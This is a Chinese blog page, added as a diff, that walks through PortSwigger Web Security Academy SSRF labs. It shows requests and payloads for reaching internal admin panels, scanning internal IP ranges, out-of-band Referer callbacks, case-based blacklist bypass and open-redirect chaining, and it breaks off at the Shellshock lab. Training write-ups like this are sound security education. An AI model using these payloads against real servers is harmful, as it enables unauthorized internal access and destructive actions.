@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 Server-side request forge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy SSRF 服务端请求伪造">
+<meta property="og:url" content="https://secdroid.github.io/2025/02/18/burp-web-academy-ssrf-server-side-request-forgery/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 Server-side request forge">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-18T14:17:56.285Z">
+<meta property="article:modified_time" content="2025-02-18T14:17:17.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/02/18/burp-web-academy-ssrf-server-side-request-forgery/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/02/18/burp-web-academy-ssrf-server-side-request-forgery/","path":"2025/02/18/burp-web-academy-ssrf-server-side-request-forgery/","title":"Burp Web Academy SSRF 服务端请求伪造"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy SSRF 服务端请求伪造 | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Server-side-request-forgery-SSRF"><span class="nav-number">2.</span> <span class="nav-text">0x02. Server-side request forgery (SSRF)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-Basic-SSRF-against-the-local-server"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: Basic SSRF against the local server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-Basic-SSRF-against-another-back-end-system"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: Basic SSRF against another back-end system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Blind-SSRF-with-out-of-band-detection"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Blind SSRF with out-of-band detection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-SSRF-with-blacklist-based-input-filter"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: SSRF with blacklist-based input filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: SSRF with filter bypass via open redirection vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-Blind-SSRF-with-Shellshock-exploitation"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: Blind SSRF with Shellshock exploitation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Lab-SSRF-with-whitelist-based-input-filter"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 Lab: SSRF with whitelist-based input filter</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/02/18/burp-web-academy-ssrf-server-side-request-forgery/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy SSRF 服务端请求伪造 | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy SSRF 服务端请求伪造
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-18 22:17:56 / 修改时间：22:17:17" itemprop="dateCreated datePublished" datetime="2025-02-18T22:17:56+08:00">2025-02-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 Server-side request forgery (SSRF) 章节（即<strong>服务端请求伪造</strong>）。</p>
+<span id="more"></span>
+
+<h2 id="0x02-Server-side-request-forgery-SSRF"><a href="#0x02-Server-side-request-forgery-SSRF" class="headerlink" title="0x02. Server-side request forgery (SSRF)"></a>0x02. Server-side request forgery (SSRF)</h2><h3 id="2-1-Lab-Basic-SSRF-against-the-local-server"><a href="#2-1-Lab-Basic-SSRF-against-the-local-server" class="headerlink" title="2.1 Lab: Basic SSRF against the local server"></a>2.1 Lab: Basic SSRF against the local server</h3><blockquote>
+<p>This lab has a stock check feature which fetches data from an internal system.</p>
+<p>To solve the lab, change the stock check URL to access the admin interface at <code>http://localhost/admin</code> and delete the user <code>carlos</code>.</p>
+</blockquote>
+<p>查看物品页面代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;stockCheckForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/product/stock&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;stockApi&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1&quot;</span>&gt;</span>London<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=2&quot;</span>&gt;</span>Paris<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=3&quot;</span>&gt;</span>Milan<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Check stock<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;stockCheckResult&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/resources/js/stockCheckPayload.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/resources/js/stockCheck.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看起来是服务端直接请求了提交的 URL：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aed004c042947e29a79298a00d10084.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=LawIAQoJKeNobRcptJ0dSTEar66MtgC9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>107</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0aed004c042947e29a79298a00d10084.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">stockApi</span>=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fstock.weliketoshop.net%<span class="number">3</span>A8080%<span class="number">2</span>Fproduct%<span class="number">2</span>Fstock%<span class="number">2</span>Fcheck%<span class="number">3</span>FproductId%<span class="number">3</span>D1%<span class="number">26</span>storeId%<span class="number">3</span>D1</span></span><br></pre></td></tr></table></figure>
+
+<p>测试站点没有账号密码可以登录，访问 <code>/admin</code> 则提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Admin interface only available if logged in as an administrator, or if requested from loopback</span><br></pre></td></tr></table></figure>
+
+<p>可以先利用 SSRF 看下页面长什么样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;span&gt;carlos - &lt;/span&gt;</span><br><span class="line">    &lt;a href=&quot;/admin/delete?username=carlos&quot;&gt;Delete&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终利用 Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://localhost/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Lab-Basic-SSRF-against-another-back-end-system"><a href="#2-2-Lab-Basic-SSRF-against-another-back-end-system" class="headerlink" title="2.2 Lab: Basic SSRF against another back-end system"></a>2.2 Lab: Basic SSRF against another back-end system</h3><blockquote>
+<p>This lab has a stock check feature which fetches data from an internal system.</p>
+<p>To solve the lab, use the stock check functionality to scan the internal <code>192.168.0.X</code> range for an admin interface on port <code>8080</code>, then use it to delete the user <code>carlos</code>.</p>
+</blockquote>
+<p>基于 Burp Intruder 发起扫描（Burp Intruder 用法可以参考 <a href="https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/">Burp Web Academy 鉴权漏洞</a>）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a9b00c803eb9507823eb058001f006c.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=h1RQ75InDS0ae9V40BlLkdHW0uSjAw0u</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>96</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a9b00c803eb9507823eb058001f006c.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">stockApi</span>=http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.§<span class="number">0</span>§:<span class="number">8080</span>/admin</span></span><br></pre></td></tr></table></figure>
+
+<p>找到 IP 地址为 <code>192.168.0.32</code>，构造如下请求删除用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://192.168.0.32:8080/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Lab-Blind-SSRF-with-out-of-band-detection"><a href="#2-3-Lab-Blind-SSRF-with-out-of-band-detection" class="headerlink" title="2.3 Lab: Blind SSRF with out-of-band detection"></a>2.3 Lab: Blind SSRF with out-of-band detection</h3><blockquote>
+<p>This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.</p>
+<p>To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.</p>
+</blockquote>
+<p>访问统计功能会访问 Referer 指定的 URL，配合 <a href="https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/">Burp Collaborator</a> 监控请求状态。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/product?productId=1</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0afb008f031c234081fbfc1000ee008c.web-security-academy.net</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://tc93yt53blgsmwiygjupj0unler5fv3k.oastify.com/</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-Lab-SSRF-with-blacklist-based-input-filter"><a href="#2-4-Lab-SSRF-with-blacklist-based-input-filter" class="headerlink" title="2.4 Lab: SSRF with blacklist-based input filter"></a>2.4 Lab: SSRF with blacklist-based input filter</h3><blockquote>
+<p>This lab has a stock check feature which fetches data from an internal system.</p>
+<p>To solve the lab, change the stock check URL to access the admin interface at <code>http://localhost/admin</code> and delete the user <code>carlos</code>.</p>
+<p>The developer has deployed two weak anti-SSRF defenses that you will need to bypass.</p>
+</blockquote>
+<p>有两道 SSRF 防御，需要绕过。</p>
+<p>尝试访问 <code>http://localhost</code> 和 <code>http://127.0.0.1</code> 都提示被拦截：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;External stock check blocked for security reasons&quot;</span><br></pre></td></tr></table></figure>
+
+<p>尝试转成十进制形式 <code>http://2130706433</code>，但是服务端好像并不支持（Chrome 浏览器是可以的）。经过多次测试，发现两道防御机制是检查是否包含关键字 <code>localhost</code> 和 <code>admin</code>，直接使用大小写可以绕过。</p>
+<p>最终利用代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://LocalHost/Admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#2-5-Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="2.5 Lab: SSRF with filter bypass via open redirection vulnerability"></a>2.5 Lab: SSRF with filter bypass via open redirection vulnerability</h3><blockquote>
+<p>This lab has a stock check feature which fetches data from an internal system.</p>
+<p>To solve the lab, change the stock check URL to access the admin interface at <code>http://192.168.0.12:8080/admin</code> and delete the user <code>carlos</code>.</p>
+<p>The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.</p>
+</blockquote>
+<p>这次直接访问的当前站点（尽管这个 API 也可以直接访问）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=/product/stock/check?productId=1&amp;storeId=1</span><br></pre></td></tr></table></figure>
+
+<p>直接访问 <code>stockApi=http://192.168.0.12:8080/admin</code>，会提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Invalid external stock check url &#x27;Invalid URL&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>物品页面最下方有一个 <code>Next product</code> 超链接，可以实现重定向：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</span> <span class="meta">HTTP/2</span></span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/2</span> <span class="number">302</span> Found</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>/product?productId=2</span></span><br><span class="line"><span class="language-http"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span></span><br><span class="line"><span class="language-http"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span></span><br></pre></td></tr></table></figure>
+
+<p>这个接口可以直接用来实现重定向：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/product/nextProduct?currentProductId=1&amp;path=http://192.168.0.12:8080/admin</span> <span class="meta">HTTP/2</span></span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/2</span> <span class="number">302</span> Found</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>http://192.168.0.12:8080/admin</span></span><br><span class="line"><span class="language-http"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span></span><br><span class="line"><span class="language-http"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span></span><br></pre></td></tr></table></figure>
+
+<p>最终利用代码（注意 <code>&amp;</code> 要编码为 <code>%26</code>）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a36007c036bf3578171a804001c00ee.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=YyAM2lZzy6LX8Clg2cR7qGaTlUOoHosg</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>109</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a36007c036bf3578171a804001c00ee.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"></span><br><span class="line"><span class="language-awk">stockApi=<span class="regexp">/product/</span>nextProduct?currentProductId=<span class="number">1</span>%<span class="number">26</span>path=http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.12</span>:<span class="number">8080</span><span class="regexp">/admin/</span><span class="keyword">delete</span>?username=carlos</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-6-Lab-Blind-SSRF-with-Shellshock-exploitation"><a href="#2-6-Lab-Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="2.6 Lab: Blind SSRF with Shellshock exploitation"></a>2.6 Lab: Blind SSRF with Shellshock exploitation</h3><blockquote>
+<p>This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.</p>
+<p>To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the <code>192.168.0.X</code> range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.</p>
+</blockquote>
